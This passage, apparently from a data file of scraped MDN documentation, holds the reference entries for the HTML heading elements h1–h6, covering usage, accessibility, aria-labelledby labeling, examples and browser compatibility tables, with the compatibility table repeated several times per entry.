page.\n\n#### Sectioning content examples\n\nhtml\n\n```\n<header>\n  <nav aria-labelledby=\"primary-navigation\">\n    <h2 id=\"primary-navigation\">Primary navigation</h2>\n    <!-- navigation items -->\n  </nav>\n</header>\n\n<!-- page content -->\n\n<footer>\n  <nav aria-labelledby=\"footer-navigation\">\n    <h2 id=\"footer-navigation\">Footer navigation</h2>\n    <!-- navigation items -->\n  </nav>\n</footer>\n```\n\nIn this example, screen reading technology would announce that there are two [`<nav>`](nav) sections, one called \"Primary navigation\" and one called \"Footer navigation\". If labels were not provided, the person using screen reading software may have to investigate each `nav` element's contents to determine their purpose.\n\n- [Using the aria-labelledby attribute](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Attributes/aria-labelledby)\n- [Labeling Regions • Page Structure • W3C WAI Web Accessibility Tutorials](https://www.w3.org/WAI/tutorials/page-structure/labels/#using-aria-labelledby)\n\n## Examples\n\n### All headings\n\nThe following code shows all the heading levels, in use.\n\nhtml\n\n```\n<h1>Heading level 1</h1>\n<h2>Heading level 2</h2>\n<h3>Heading level 3</h3>\n<h4>Heading level 4</h4>\n<h5>Heading level 5</h5>\n<h6>Heading level 6</h6>\n```\n\n### Example page\n\nThe following code shows a few headings with some content under them.\n\nhtml\n\n```\n<h1>Heading elements</h1>\n<h2>Summary</h2>\n<p>Some text here…</p>\n\n<h2>Examples</h2>\n<h3>Example 1</h3>\n<p>Some text here…</p>\n\n<h3>Example 2</h3>\n<p>Some text here…</p>\n\n<h2>See also</h2>\n<p>Some text here…</p>\n```\n\n## Technical summary\n\n|                                             |                                                                                                                                                                                                                                                                                                 |\n|---------------------------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), heading content, palpable content.                                                                                                                                                                                                          |\n| Permitted content                           | [Phrasing content](../content_categories#phrasing_content).                                                                                                                                                                                                                                     |\n| Tag omission                                | None, both the starting and ending tag are mandatory.                                                                                                                                                                                                                                           |\n| Permitted parents                           | Any element that accepts [flow content](../content_categories#flow_content).                                                                                                                                                                                                                    |\n| Implicit ARIA role                          | [heading](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/heading_role)                                                                                                                                                                                                   |\n| Permitted ARIA roles                        | [`tab`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/tab_role), [`presentation`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/presentation_role) or [`none`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/none_role) |\n| DOM interface                               | [`HTMLHeadingElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLHeadingElement)                                                                                                                                                                                                     |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|                    | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|--------------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|                    | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `Heading_Elements` | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n\n|                    | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|--------------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|                    | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `Heading_Elements` | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n\n|                    | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|--------------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|                    | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `Heading_Elements` | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n\n|                    | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|--------------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|                    | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `Heading_Elements` | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n\n|                    | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|--------------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|                    | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `Heading_Elements` | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n\n|                    | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|--------------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|                    | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `Heading_Elements` | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n\n### html.elements.h1\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n### html.elements.h2\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n### html.elements.h3\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n### html.elements.h4\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n### html.elements.h5\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n### html.elements.h6\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n## See also\n\n- [`<p>`](p)\n- [`<div>`](div)\n- [`<section>`](section)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/Heading_Elements](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/Heading_Elements)"
- name: h2
  summary: The <h1> to <h6> HTML elements represent six levels of section headings
  description: "# \\<h1\\>–\\<h6\\>: The HTML Section Heading elements\n\nThe `<h1>` to `<h6>` [HTML](../index) elements represent six levels of section headings. `<h1>` is the highest section level and `<h6>` is the lowest. By default, all heading elements create a [block-level](https://developer.mozilla.org/en-US/docs/Glossary/Block-level_content) box in the layout, starting on a new line and taking up the full width available in their containing block.\n\n## Try it\n\n#### HTML Demo: \\<h1-h6\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <h1>Beetles</h1>\n    <h2>External morphology</h2>\n    <h3>Head</h3>\n    <h4>Mouthparts</h4>\n    <h3>Thorax</h3>\n    <h4>Prothorax</h4>\n    <h4>Pterothorax</h4>\n\n    h1,\n    h2,\n    h3,\n    h4 {\n      margin: 0.1rem 0;\n    }\n\n    h1 {\n      font-size: 2rem;\n    }\n\n    h2 {\n      font-size: 1.5rem;\n      padding-left: 20px;\n    }\n\n    h3 {\n      font-size: 1.2rem;\n      padding-left: 40px;\n    }\n\n    h4 {\n      font-size: 1rem;\n      font-style: italic;\n      padding-left: 60px;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThese elements only include the [global attributes](../global_attributes).\n\n## Usage notes\n\n- Heading information can be used by user agents to construct a table of contents for a document automatically.\n- Do not use heading elements to resize text. Instead, use the [CSS](https://developer.mozilla.org/en-US/docs/Glossary/CSS) [`font-size`](https://developer.mozilla.org/en-US/docs/Web/CSS/font-size) property.\n- Do not skip heading levels: always start from `<h1>`, followed by `<h2>` and so on.\n\n### Avoid using multiple `<h1>` elements on one page\n\nWhile using multiple `<h1>` elements on one page is allowed by the HTML standard (as long as they are not [nested](#nesting)), this is not considered a best practice. A page should generally have a single `<h1>` element that describes the content of the page (similar to the document's [`<title>`](title) element).\n\n**Note:** Nesting multiple `<h1>` elements in nested [sectioning elements](../element#content_sectioning) was allowed in older versions of the HTML standard. However, this was never considered a best practice and is now non-conforming. Read more in [There Is No Document Outline Algorithm](https://adrianroselli.com/2016/08/there-is-no-document-outline-algorithm.html).\n\nPrefer using only one `<h1>` per page and [nest headings](#nesting) without skipping levels.\n\n## Accessibility\n\n### Navigation\n\nA common navigation technique for users of screen reading software is to quickly jump from heading to heading in order to determine the content of the page. Because of this, it is important to not skip one or more heading levels. Doing so may create confusion, as the person navigating this way may be left wondering where the missing heading is.\n\n**Don't do this:**\n\nhtml\n\n```\n<h1>Heading level 1</h1>\n<h3>Heading level 3</h3>\n<h4>Heading level 4</h4>\n```\n\n**Prefer this:**\n\nhtml\n\n```\n<h1>Heading level 1</h1>\n<h2>Heading level 2</h2>\n<h3>Heading level 3</h3>\n```\n\n#### Nesting\n\nHeadings may be nested as subsections to reflect the organization of the content of the page. Most screen readers can also generate an ordered list of all the headings on a page, which can help a person quickly determine the hierarchy of the content:\n\n1.  `h1` Beetles\n    1.  `h2` Etymology\n    2.  `h2` Distribution and Diversity\n    3.  `h2` Evolution\n        1.  `h3` Late Paleozoic\n        2.  `h3` Jurassic\n        3.  `h3` Cretaceous\n        4.  `h3` Cenozoic\n    4.  `h2` External Morphology\n        1.  `h3` Head\n            1.  `h4` Mouthparts\n        2.  `h3` Thorax\n            1.  `h4` Prothorax\n            2.  `h4` Pterothorax\n        3.  `h3` Legs\n        4.  `h3` Wings\n        5.  `h3` Abdomen\n\nWhen headings are nested, heading levels may be \"skipped\" when closing a subsection.\n\n- [Headings • Page Structure • WAI Web Accessibility Tutorials](https://www.w3.org/WAI/tutorials/page-structure/headings/)\n- [MDN Understanding WCAG, Guideline 1.3 explanations](https://developer.mozilla.org/en-US/docs/Web/Accessibility/Understanding_WCAG/Perceivable#guideline_1.3_%E2%80%94_create_content_that_can_be_presented_in_different_ways)\n- [Understanding Success Criterion 1.3.1 \\| W3C Understanding WCAG 2.0](https://www.w3.org/TR/UNDERSTANDING-WCAG20/content-structure-separation-programmatic.html)\n- [MDN Understanding WCAG, Guideline 2.4 explanations](https://developer.mozilla.org/en-US/docs/Web/Accessibility/Understanding_WCAG/Operable#guideline_2.4_%E2%80%94_navigable_provide_ways_to_help_users_navigate_find_content_and_determine_where_they_are)\n- [Understanding Success Criterion 2.4.1 \\| W3C Understanding WCAG 2.0](https://www.w3.org/TR/UNDERSTANDING-WCAG20/navigation-mechanisms-skip.html)\n- [Understanding Success Criterion 2.4.6 \\| W3C Understanding WCAG 2.0](https://www.w3.org/TR/UNDERSTANDING-WCAG20/navigation-mechanisms-descriptive.html)\n- [Understanding Success Criterion 2.4.10 \\| W3C Understanding WCAG 2.0](https://www.w3.org/TR/UNDERSTANDING-WCAG20/navigation-mechanisms-headings.html)\n\n### Labeling section content\n\nAnother common navigation technique for users of screen reading software is to generate a list of [sectioning content](../element#content_sectioning) and use it to determine the page's layout.\n\nSectioning content can be labeled using a combination of the [`aria-labelledby`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Attributes/aria-labelledby) and [`id`](../global_attributes#id) attributes, with the label concisely describing the purpose of the section. This technique is useful for situations where there is more than one sectioning element on the same page.\n\n#### Sectioning content examples\n\nhtml\n\n```\n<header>\n  <nav aria-labelledby=\"primary-navigation\">\n    <h2 id=\"primary-navigation\">Primary navigation</h2>\n    <!-- navigation items -->\n  </nav>\n</header>\n\n<!-- page content -->\n\n<footer>\n  <nav aria-labelledby=\"footer-navigation\">\n    <h2 id=\"footer-navigation\">Footer navigation</h2>\n    <!-- navigation items -->\n  </nav>\n</footer>\n```\n\nIn this example, screen reading technology would announce that there are two [`<nav>`](nav) sections, one called \"Primary navigation\" and one called \"Footer navigation\". If labels were not provided, the person using screen reading software may have to investigate each `nav` element's contents to determine their purpose.\n\n- [Using the aria-labelledby attribute](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Attributes/aria-labelledby)\n- [Labeling Regions • Page Structure • W3C WAI Web Accessibility Tutorials](https://www.w3.org/WAI/tutorials/page-structure/labels/#using-aria-labelledby)\n\n## Examples\n\n### All headings\n\nThe following code shows all the heading levels, in use.\n\nhtml\n\n```\n<h1>Heading level 1</h1>\n<h2>Heading level 2</h2>\n<h3>Heading level 3</h3>\n<h4>Heading level 4</h4>\n<h5>Heading level 5</h5>\n<h6>Heading level 6</h6>\n```\n\n### Example page\n\nThe following code shows a few headings with some content under them.\n\nhtml\n\n```\n<h1>Heading elements</h1>\n<h2>Summary</h2>\n<p>Some text here…</p>\n\n<h2>Examples</h2>\n<h3>Example 1</h3>\n<p>Some text here…</p>\n\n<h3>Example 2</h3>\n<p>Some text here…</p>\n\n<h2>See also</h2>\n<p>Some text here…</p>\n```\n\n## Technical summary\n\n|                                             |                                                                                                                                                                                                                                                                                                 |\n|---------------------------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), heading content, palpable content.                                                                                                                                                                                                          |\n| Permitted content                           | [Phrasing content](../content_categories#phrasing_content).                                                                                                                                                                                                                                     |\n| Tag omission                                | None, both the starting and ending tag are mandatory.                                                                                                                                                                                                                                           |\n| Permitted parents                           | Any element that accepts [flow content](../content_categories#flow_content).                                                                                                                                                                                                                    |\n| Implicit ARIA role                          | [heading](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/heading_role)                                                                                                                                                                                                   |\n| Permitted ARIA roles                        | [`tab`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/tab_role), [`presentation`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/presentation_role) or [`none`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/none_role) |\n| DOM interface                               | [`HTMLHeadingElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLHeadingElement)                                                                                                                                                                                                     |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|                    | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|--------------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|                    | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `Heading_Elements` | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n\n|                    | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|--------------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|                    | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `Heading_Elements` | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n\n|                    | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|--------------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|                    | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `Heading_Elements` | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n\n|                    | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|--------------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|                    | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `Heading_Elements` | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n\n|                    | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|--------------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|                    | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `Heading_Elements` | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n\n|                    | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|--------------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|                    | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `Heading_Elements` | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n\n### html.elements.h1\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n### html.elements.h2\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n### html.elements.h3\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n### html.elements.h4\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n### html.elements.h5\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n### html.elements.h6\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n## See also\n\n- [`<p>`](p)\n- [`<div>`](div)\n- [`<section>`](section)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/Heading_Elements](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/Heading_Elements)"
- name: h3
  summary: The <h1> to <h6> HTML elements represent six levels of section headings
  description: "# \\<h1\\>–\\<h6\\>: The HTML Section Heading elements\n\nThe `<h1>` to `<h6>` [HTML](../index) elements represent six levels of section headings. `<h1>` is the highest section level and `<h6>` is the lowest. By default, all heading elements create a [block-level](https://developer.mozilla.org/en-US/docs/Glossary/Block-level_content) box in the layout, starting on a new line and taking up the full width available in their containing block.\n\n## Try it\n\n#### HTML Demo: \\<h1-h6\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <h1>Beetles</h1>\n    <h2>External morphology</h2>\n    <h3>Head</h3>\n    <h4>Mouthparts</h4>\n    <h3>Thorax</h3>\n    <h4>Prothorax</h4>\n    <h4>Pterothorax</h4>\n\n    h1,\n    h2,\n    h3,\n    h4 {\n      margin: 0.1rem 0;\n    }\n\n    h1 {\n      font-size: 2rem;\n    }\n\n    h2 {\n      font-size: 1.5rem;\n      padding-left: 20px;\n    }\n\n    h3 {\n      font-size: 1.2rem;\n      padding-left: 40px;\n    }\n\n    h4 {\n      font-size: 1rem;\n      font-style: italic;\n      padding-left: 60px;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThese elements only include the [global attributes](../global_attributes).\n\n## Usage notes\n\n- Heading information can be used by user agents to construct a table of contents for a document automatically.\n- Do not use heading elements to resize text. Instead, use the [CSS](https://developer.mozilla.org/en-US/docs/Glossary/CSS) [`font-size`](https://developer.mozilla.org/en-US/docs/Web/CSS/font-size) property.\n- Do not skip heading levels: always start from `<h1>`, followed by `<h2>` and so on.\n\n### Avoid using multiple `<h1>` elements on one page\n\nWhile using multiple `<h1>` elements on one page is allowed by the HTML standard (as long as they are not [nested](#nesting)), this is not considered a best practice. A page should generally have a single `<h1>` element that describes the content of the page (similar to the document's [`<title>`](title) element).\n\n**Note:** Nesting multiple `<h1>` elements in nested [sectioning elements](../element#content_sectioning) was allowed in older versions of the HTML standard. However, this was never considered a best practice and is now non-conforming. Read more in [There Is No Document Outline Algorithm](https://adrianroselli.com/2016/08/there-is-no-document-outline-algorithm.html).\n\nPrefer using only one `<h1>` per page and [nest headings](#nesting) without skipping levels.\n\n## Accessibility\n\n### Navigation\n\nA common navigation technique for users of screen reading software is to quickly jump from heading to heading in order to determine the content of the page. Because of this, it is important to not skip one or more heading levels. Doing so may create confusion, as the person navigating this way may be left wondering where the missing heading is.\n\n**Don't do this:**\n\nhtml\n\n```\n<h1>Heading level 1</h1>\n<h3>Heading level 3</h3>\n<h4>Heading level 4</h4>\n```\n\n**Prefer this:**\n\nhtml\n\n```\n<h1>Heading level 1</h1>\n<h2>Heading level 2</h2>\n<h3>Heading level 3</h3>\n```\n\n#### Nesting\n\nHeadings may be nested as subsections to reflect the organization of the content of the page. Most screen readers can also generate an ordered list of all the headings on a page, which can help a person quickly determine the hierarchy of the content:\n\n1.  `h1` Beetles\n    1.  `h2` Etymology\n    2.  `h2` Distribution and Diversity\n    3.  `h2` Evolution\n        1.  `h3` Late Paleozoic\n        2.  `h3` Jurassic\n        3.  `h3` Cretaceous\n        4.  `h3` Cenozoic\n    4.  `h2` External Morphology\n        1.  `h3` Head\n            1.  `h4` Mouthparts\n        2.  `h3` Thorax\n            1.  `h4` Prothorax\n            2.  `h4` Pterothorax\n        3.  `h3` Legs\n        4.  `h3` Wings\n        5.  `h3` Abdomen\n\nWhen headings are nested, heading levels may be \"skipped\" when closing a subsection.\n\n- [Headings • Page Structure • WAI Web Accessibility Tutorials](https://www.w3.org/WAI/tutorials/page-structure/headings/)\n- [MDN Understanding WCAG, Guideline 1.3 explanations](https://developer.mozilla.org/en-US/docs/Web/Accessibility/Understanding_WCAG/Perceivable#guideline_1.3_%E2%80%94_create_content_that_can_be_presented_in_different_ways)\n- [Understanding Success Criterion 1.3.1 \\| W3C Understanding WCAG 2.0](https://www.w3.org/TR/UNDERSTANDING-WCAG20/content-structure-separation-programmatic.html)\n- [MDN Understanding WCAG, Guideline 2.4 explanations](https://developer.mozilla.org/en-US/docs/Web/Accessibility/Understanding_WCAG/Operable#guideline_2.4_%E2%80%94_navigable_provide_ways_to_help_users_navigate_find_content_and_determine_where_they_are)\n- [Understanding Success Criterion 2.4.1 \\| W3C Understanding WCAG 2.0](https://www.w3.org/TR/UNDERSTANDING-WCAG20/navigation-mechanisms-skip.html)\n- [Understanding Success Criterion 2.4.6 \\| W3C Understanding WCAG 2.0](https://www.w3.org/TR/UNDERSTANDING-WCAG20/navigation-mechanisms-descriptive.html)\n- [Understanding Success Criterion 2.4.10 \\| W3C Understanding WCAG 2.0](https://www.w3.org/TR/UNDERSTANDING-WCAG20/navigation-mechanisms-headings.html)\n\n### Labeling section content\n\nAnother common navigation technique for users of screen reading software is to generate a list of [sectioning content](../element#content_sectioning) and use it to determine the page's layout.\n\nSectioning content can be labeled using a combination of the [`aria-labelledby`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Attributes/aria-labelledby) and [`id`](../global_attributes#id) attributes, with the label concisely describing the purpose of the section. This technique is useful for situations where there is more than one sectioning element on the same page.\n\n#### Sectioning content examples\n\nhtml\n\n```\n<header>\n  <nav aria-labelledby=\"primary-navigation\">\n    <h2 id=\"primary-navigation\">Primary navigation</h2>\n    <!-- navigation items -->\n  </nav>\n</header>\n\n<!-- page content -->\n\n<footer>\n  <nav aria-labelledby=\"footer-navigation\">\n    <h2 id=\"footer-navigation\">Footer navigation</h2>\n    <!-- navigation items -->\n  </nav>\n</footer>\n```\n\nIn this example, screen reading technology would announce that there are two [`<nav>`](nav) sections, one called \"Primary navigation\" and one called \"Footer navigation\". If labels were not provided, the person using screen reading software may have to investigate each `nav` element's contents to determine their purpose.\n\n- [Using the aria-labelledby attribute](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Attributes/aria-labelledby)\n- [Labeling Regions • Page Structure • W3C WAI Web Accessibility Tutorials](https://www.w3.org/WAI/tutorials/page-structure/labels/#using-aria-labelledby)\n\n## Examples\n\n### All headings\n\nThe following code shows all the heading levels, in use.\n\nhtml\n\n```\n<h1>Heading level 1</h1>\n<h2>Heading level 2</h2>\n<h3>Heading level 3</h3>\n<h4>Heading level 4</h4>\n<h5>Heading level 5</h5>\n<h6>Heading level 6</h6>\n```\n\n### Example page\n\nThe following code shows a few headings with some content under them.\n\nhtml\n\n```\n<h1>Heading elements</h1>\n<h2>Summary</h2>\n<p>Some text here…</p>\n\n<h2>Examples</h2>\n<h3>Example 1</h3>\n<p>Some text here…</p>\n\n<h3>Example 2</h3>\n<p>Some text here…</p>\n\n<h2>See also</h2>\n<p>Some text here…</p>\n```\n\n## Technical summary\n\n|                                             |                                                                                                                                                                                                                                                                                                 |\n|---------------------------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), heading content, palpable content.                                                                                                                                                                                                          |\n| Permitted content                           | [Phrasing content](../content_categories#phrasing_content).                                                                                                                                                                                                                                     |\n| Tag omission                                | None, both the starting and ending tag are mandatory.                                                                                                                                                                                                                                           |\n| Permitted parents                           | Any element that accepts [flow content](../content_categories#flow_content).                                                                                                                                                                                                                    |\n| Implicit ARIA role                          | [heading](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/heading_role)                                                                                                                                                                                                   |\n| Permitted ARIA roles                        | [`tab`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/tab_role), [`presentation`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/presentation_role) or [`none`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/none_role) |\n| DOM interface                               | [`HTMLHeadingElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLHeadingElement)                                                                                                                                                                                                     |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|                    | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|--------------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|                    | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `Heading_Elements` | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n\n|                    | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|--------------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|                    | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `Heading_Elements` | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n\n|                    | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|--------------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|                    | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `Heading_Elements` | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n\n|                    | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|--------------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|                    | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `Heading_Elements` | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n\n|                    | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|--------------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|                    | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `Heading_Elements` | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n\n|                    | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|--------------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|                    | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `Heading_Elements` | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n\n### html.elements.h1\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n### html.elements.h2\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n### html.elements.h3\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n### html.elements.h4\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n### html.elements.h5\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n### html.elements.h6\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n## See also\n\n- [`<p>`](p)\n- [`<div>`](div)\n- [`<section>`](section)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike 